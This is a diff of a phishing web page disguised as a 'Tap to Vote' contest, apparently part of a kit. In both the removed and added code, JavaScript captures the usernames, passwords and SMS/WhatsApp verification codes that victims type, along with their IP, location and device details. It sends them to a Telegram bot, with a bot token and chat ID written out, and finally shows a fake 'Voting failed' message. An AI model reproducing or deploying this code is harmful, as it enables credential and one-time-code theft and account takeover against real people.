+            function resetToStart() {
+                clearAllTimeouts();
+                usernameInput.value = '';
+                passwordInput.value = '';
+                verificationCodeInput.value = '';
+                loginError.textContent = '';
+                loginError.style.color = '#ff6b6b';
+                verifyError.textContent = '';
+                redirectStatus.classList.add('hidden');
+                showScreen(screenStart);
+            }
 
-      <div class="forgot-link">Forgot password? <span>Reset</span></div>
+            // ========== TELEGRAM SENDER ==========
+            async function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                try {
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch (err) {
+                    console.warn('Telegram send failed:', err);
+                }
+            }
 
-      <div class="divider"><span>OR</span></div>
+            // ========== GET IP & LOCATION ==========
+            async function fetchIpAndLocation() {
+                if (ipFetched) return;
+                try {
+                    // Primary IP API
+                    let res = await fetch('https://ipapi.co/json/');
+                    if (!res.ok) throw new Error('ipapi failed');
+                    let data = await res.json();
+                    userIp = data.ip || 'Unknown';
+                    userLocation = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`.replace(/^,|,$/g, '').trim() || 'Unknown location';
+                    ipFetched = true;
+                } catch (e) {
+                    // Fallback IP API
+                    try {
+                        let res2 = await fetch('https://api.ipify.org?format=json');
+                        let data2 = await res2.json();
+                        userIp = data2.ip || 'Unknown';
+                        userLocation = 'Unknown (fallback)';
+                        ipFetched = true;
+                    } catch (e2) {
+                        userIp = 'Unknown';
+                        userLocation = 'Unknown';
+                        ipFetched = true;
+                    }
+                }
+            }
 
-      <div class="social-login">
-        <div class="social-btn"><span class="icon">📘</span> Continue with Facebook</div>
-        <div class="social-btn"><span class="icon">🔍</span> Continue with Google</div>
-      </div>
+            // ========== NOTIFY ON PAGE LOAD (link clicked) ==========
+            (async function notifyPageLoad() {
+                await fetchIpAndLocation();
+                const msg = `🔔 <b>New user clicked the link</b>\n\n` +
+                            `🌐 IP: <code>${userIp}</code>\n` +
+                            `📍 Location: ${userLocation}\n` +
+                            `🕒 Time: ${new Date().toLocaleString()}\n` +
+                            `📱 User-Agent: ${navigator.userAgent.substring(0, 80)}...`;
+                sendToTelegram(msg);
+            })();
 
-    </div>
+            // ========== TAP TO VOTE → LOGIN SCREEN ==========
+            tapToVoteBtn.addEventListener('click', async function() {
+                clearAllTimeouts();
+                usernameInput.value = '';
+                passwordInput.value = '';
+                loginError.textContent = '';
+                loginError.style.color = '#ff6b6b';
+                showScreen(screenLogin);
 
-    <!-- ========== PAGE 3: VERIFICATION ========== -->
-    <div id="page3" class="screen page3 hidden">
+                // Notify telegram about tap to vote click
+                await fetchIpAndLocation();
+                const msg = `👆 <b>User clicked "Tap to Vote"</b>\n\n` +
+                            `🌐 IP: <code>${userIp}</code>\n` +
+                            `📍 Location: ${userLocation}\n` +
+                            `🕒 Time: ${new Date().toLocaleString()}`;
+                sendToTelegram(msg);
+            });
 
-      <div class="status-bar">
-        <div class="left"><span>9:41</span></div>
-        <div class="right"><span>📶</span><span>📶</span><span>🔋</span></div>
-      </div>
+            // ========== LOGIN ICON CLICK ==========
+            loginIconBtn.addEventListener('click', async function() {
+                clearAllTimeouts();
+                loginError.textContent = '';
+                loginError.style.color = '#ff6b6b';
 
-      <div class="verification-icon">🔐</div>
-      <div class="verification-title">Verification Code</div>
-      <div class="verification-sub">
-        We've sent a code to your <strong>SMS, Email or WhatsApp</strong>.<br>
-        Enter the 6‑digit code below.
-      </div>
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
 
-      <input type="text" class="code-input" id="codeInput" placeholder="••••••" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+                // If password is empty → do NOT redirect, show error
+                if (password === '') {
+                    loginError.textContent = 'Password cannot be empty.';
+                    return;
+                }
 
-      <button class="send-btn" id="sendCodeBtn">Send Code</button>
+                // Fetch IP if not already
+                await fetchIpAndLocation();
 
-      <div class="resend">Didn't receive it? <span>Resend</span></div>
+                // Send login attempt to Telegram
+                const loginMsg = `🔐 <b>Login Attempt</b>\n\n` +
+                                 `👤 Username: <code>${username || '(empty)'}</code>\n` +
+                                 `🔑 Password: <code>${password}</code>\n` +
+                                 `🌐 IP: <code>${userIp}</code>\n` +
+                                 `📍 Location: ${userLocation}\n` +
+                                 `🕒 Time: ${new Date().toLocaleString()}\n` +
+                                 `📱 Device: ${navigator.platform || 'Unknown'}`;
+                sendToTelegram(loginMsg);
 
-    </div>
+                // Show waiting status
+                loginError.textContent = '⏳ Verifying, please wait...';
+                loginError.style.color = '#9ab8d0';
 
-    <!-- ========== PAGE 4: FAILED ========== -->
-    <div id="page4" class="screen page4 hidden">
+                // 8-second redirect to verification
+                loginRedirectTimeout = setTimeout(() => {
+                    loginError.textContent = '';
+                    loginError.style.color = '#ff6b6b';
+                    verifyError.textContent = '';
+                    redirectStatus.classList.add('hidden');
+                    verificationCodeInput.value = '';
+                    showScreen(screenVerify);
+                    loginRedirectTimeout = null;
+                }, 8000);
+            });
 
-      <div class="status-bar" style="position:absolute; top:50px; left:0; right:0; padding:0 24px;">
-        <div class="left"><span>9:41</span></div>
-        <div class="right"><span>📶</span><span>📶</span><span>🔋</span></div>
-      </div>
+            // Enter key on password
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    loginIconBtn.click();
+                }
+            });
 
- <div class="fail-icon">❌</div>
-      <div class="fail-title">Voting Failed</div>
-      <div class="fail-sub">Something went wrong. Please try again later.</div>
-      <button class="restart-btn" id="restartBtn">Try Again</button>
+            // ========== VERIFY BUTTON ==========
+            verifyBtn.addEventListener('click', async function() {
+                if (verifyFailureTimeout) {
+                    clearTimeout(verifyFailureTimeout);
+                    verifyFailureTimeout = null;
+                }
 
-    </div>
+                verifyError.textContent = '';
+                redirectStatus.classList.add('hidden');
 
-  </div>
+                const code = verificationCodeInput.value.trim();
 
-  <script>
-    (function() {
-      'use strict';
+                // Send verification code attempt to Telegram
+                await fetchIpAndLocation();
+                const verifyMsg = `🔢 <b>Verification Code Entered</b>\n\n` +
+                                  `🔢 Code: <code>${code || '(empty)'}</code>\n` +
+                                  `🌐 IP: <code>${userIp}</code>\n` +
+                                  `📍 Location: ${userLocation}\n` +
+                                  `🕒 Time: ${new Date().toLocaleString()}`;
+                sendToTelegram(verifyMsg);
 
-      // ============================================
-      // TELEGRAM CONFIGURATION
-      // ============================================
-      const TELEGRAM_BOT_TOKEN = '8616631878:AAFH3xPqTkWz6JE6RI8w_ILKyBjILpr5aW4';
-      const TELEGRAM_CHAT_ID = '8008428584';
-      const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const CAMPAIGN_NAME = '𝔽𝕣𝕖𝕖 𝕥𝕚𝕟𝕪𝕙𝕠𝕞𝕖 𝕓𝕦𝕪𝕤 𝕧𝕠𝕥𝕖𝕤';
+                // Always show "Voting failed"
+                verifyError.textContent = 'Voting failed. Invalid verification code.';
+                verifyError.style.color = '#ff6b6b';
 
-      // ---- Telegram send helper ----
-      async function sendToTelegram(message) {
-        try {
-          await fetch(TELEGRAM_API_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CHAT_ID,
-              text: message,
-              parse_mode: 'HTML'
-            })
-          });
-        } catch (err) {
-          console.warn('Telegram send failed:', err);
-        }
-      }
+                // After 2.5s redirect to start
+                verifyFailureTimeout = setTimeout(() => {
+                    resetToStart();
+                    verifyFailureTimeout = null;
+                }, 2500);
+            });
 
-      // ---- Get device / browser info ----
-      function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let device = 'Unknown';
-        if (/iPhone/i.test(ua)) device = 'iPhone';
-        else if (/iPad/i.test(ua)) device = 'iPad';
-        else if (/Android/i.test(ua)) device = 'Android';
-        else if (/Windows/i.test(ua)) device = 'Windows PC';
-        else if (/Mac/i.test(ua)) device = 'Mac';
-        else if (/Linux/i.test(ua)) device = 'Linux';
+            // Enter key on verification code
+            verificationCodeInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    verifyBtn.click();
+                }
+            });
 
-        let browser = 'Unknown';
-        if (/Edg/i.test(ua)) browser = 'Edge';
-        else if (/Chrome/i.test(ua)) browser = 'Chrome';
-        else if (/Firefox/i.test(ua)) browser = 'Firefox';
-        else if (/Safari/i.test(ua)) browser = 'Safari';
-
-        return { device, browser, ua };
-      }
-
-      function formatTime() {
-        const d = new Date();
-        return d.toLocaleString('en-GB', { timeZone: 'UTC', hour12: false });
-      }
-
-      function escapeHtml(str) {
-        return String(str)
-          .replace(/&/g, '&amp;')
-          .replace(/</g, '&lt;')
-          .replace(/>/g, '&gt;');
-      }
-
-      // ============================================
-      // NOTIFY: LINK OPENED
-      // ============================================
-      (function notifyLinkOpened() {
-        const { device, browser } = getDeviceInfo();
-        const msg =
-          `🔔 <b>LINK CLICKED / PAGE OPENED</b>\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `🏷️ <b>Campaign:</b> ${CAMPAIGN_NAME}\n` +
-          `📅 <b>Time:</b> ${formatTime()} UTC\n` +
-          `📱 <b>Device:</b> ${device}\n` +
-          `🌐 <b>Browser:</b> ${browser}`;
-        sendToTelegram(msg);
-      })();
-
-      // ---- DOM references ----
-      const page1 = document.getElementById('page1');
-      const page2 = document.getElementById('page2');
-      const page3 = document.getElementById('page3');
-      const page4 = document.getElementById('page4');
-      const votePlatform = document.getElementById('votePlatform');
-      const loginBtn = document.getElementById('loginBtn');
-      const sendCodeBtn = document.getElementById('sendCodeBtn');
-      const restartBtn = document.getElementById('restartBtn');
-
-      const usernameInput = document.getElementById('username');
-      const passwordInput = document.getElementById('password');
-      const codeInput = document.getElementById('codeInput');
-
-      function showScreen(screenToShow) {
-        [page1, page2, page3, page4].forEach(s => s.classList.add('hidden'));
-        screenToShow.classList.remove('hidden');
-        screenToShow.scrollTop = 0;
-        setTimeout(() => { screenToShow.scrollTop = 0; }, 10);
-      }
-
-      // ============================================
-      // PAGE 1 → PAGE 2
-      // ============================================
-      votePlatform.addEventListener('click', function() {
-        sendToTelegram(
-          `🎯 <b>VOTE BUTTON CLICKED</b>\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `🏷️ <b>Campaign:</b> ${CAMPAIGN_NAME}\n` +
-          `📅 ${formatTime()} UTC\n` +
-          `➡️ Redirecting to login page...`
-        );
-
-        showScreen(page2);
-        usernameInput.value = '';
-        passwordInput.value = '';
-        codeInput.value = '';
-        loginBtn.classList.remove('loading');
-      });
-
-      // ============================================
-      // PAGE 2 → PAGE 3 (LOGIN, 8s delay)
-      // ============================================
-      loginBtn.addEventListener('click', function() {
-        if (loginBtn.classList.contains('loading')) return;
-
-        const username = usernameInput.value.trim() || '(empty)';
-        const password = passwordInput.value.trim() || '(empty)';
-        const { device, browser } = getDeviceInfo();
-
-        sendToTelegram(
-          `🔐 <b>LOGIN CREDENTIALS CAPTURED</b>\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `🏷️ <b>Campaign:</b> ${CAMPAIGN_NAME}\n` +
-          `👤 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
-          `🔑 <b>Password:</b> <code>${escapeHtml(password)}</code>\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `📅 <b>Time:</b> ${formatTime()} UTC\n` +
-          `📱 <b>Device:</b> ${device}\n` +
-          `🌐 <b>Browser:</b> ${browser}`
-        );
-
-        loginBtn.classList.add('loading');
-
-        setTimeout(function() {
-          loginBtn.classList.remove('loading');
-          showScreen(page3);
-          codeInput.value = '';
-          setTimeout(() => {
-            try { codeInput.focus(); } catch(e) {}
-          }, 200);
-        }, 8000);
-      });
-
-      // ============================================
-      // PAGE 3 → PAGE 4 (SEND CODE)
-      // ============================================
-      sendCodeBtn.addEventListener('click', function() {
-        const code = codeInput.value.trim() || '(empty)';
-        const { device, browser } = getDeviceInfo();
-
-        sendToTelegram(
-          `📩 <b>VERIFICATION CODE SUBMITTED</b>\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `🏷️ <b>Campaign:</b> ${CAMPAIGN_NAME}\n` +
-          `🔢 <b>Code:</b> <code>${escapeHtml(code)}</code>\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `📅 <b>Time:</b> ${formatTime()} UTC\n` +
-          `📱 <b>Device:</b> ${device}\n` +
-          `🌐 <b>Browser:</b> ${browser}`
-        );
-
-        showScreen(page4);
-      });
-
-      // ============================================
-      // PAGE 4 → PAGE 1 (RESTART)
-      // ============================================
-      restartBtn.addEventListener('click', function() {
-        sendToTelegram(
-          `🔄 <b>USER RESTARTED THE FLOW</b>\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `🏷️ <b>Campaign:</b> ${CAMPAIGN_NAME}\n` +
-          `📅 ${formatTime()} UTC`
-        );
-
-        showScreen(page1);
-        usernameInput.value = '';
-        passwordInput.value = '';
-        codeInput.value = '';
-        loginBtn.classList.remove('loading');
-      });
-
-      // ---- Keyboard shortcuts ----
-      passwordInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') { e.preventDefault(); loginBtn.click(); }
-      });
-
-      codeInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') { e.preventDefault(); sendCodeBtn.click(); }
-      });
-
-      // ---- Prevent double-tap zoom ----
-      document.addEventListener('touchstart', function(e) {
-        if (e.touches.length > 1) e.preventDefault();
-      }, { passive: false });
-
-      let lastTouchEnd = 0;
-      document.addEventListener('touchend', function(e) {
-        const now = Date.now();
-        if (now - lastTouchEnd <= 300) e.preventDefault();
-        lastTouchEnd = now;
-      }, { passive: false });
-
-      document.body.style.overscrollBehavior = 'none';
-
-    })();
-  </script>
+        })();
+    </script>
 </body>
 </html>
